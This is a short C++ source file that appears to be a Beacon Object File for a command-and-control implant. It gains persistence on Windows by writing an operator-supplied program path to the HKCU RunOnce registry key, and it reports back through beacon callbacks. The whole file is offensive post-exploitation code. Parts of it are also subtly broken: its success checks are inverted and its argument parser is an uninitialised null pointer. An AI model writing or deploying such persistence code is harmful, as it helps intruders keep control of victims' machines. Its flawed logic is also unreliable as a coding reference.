#include <Externs.hpp>
#include <Common.hpp>
#include <Strings.cc>

auto AutoStart(
    _In_ PCHAR Path
) -> VOID {
    LONG Result    = 0;
    HKEY KeyHandle = nullptr;

    Result = RegOpenKeyExA(
        HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_WRITE, &KeyHandle
    );
    if ( !Result ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] Error in the open registry key: %d", GetLastError()); return;
    };

    Result = RegSetValueExA( KeyHandle, "AutoStart", 0, REG_SZ, (PBYTE)Path, Str::LengthA( Path ) +1 );
    if ( !Result ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] Error in the set registry key: %d", GetLastError()); return;
    };

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Auto start persistence done");
}

auto go(PCHAR Args, INT Argc) -> void {
    Start();

    Data* Parser = { 0 };

    PCHAR Path = BeaconDataExtract( Parser, 0 );

    AutoStart( Path );
}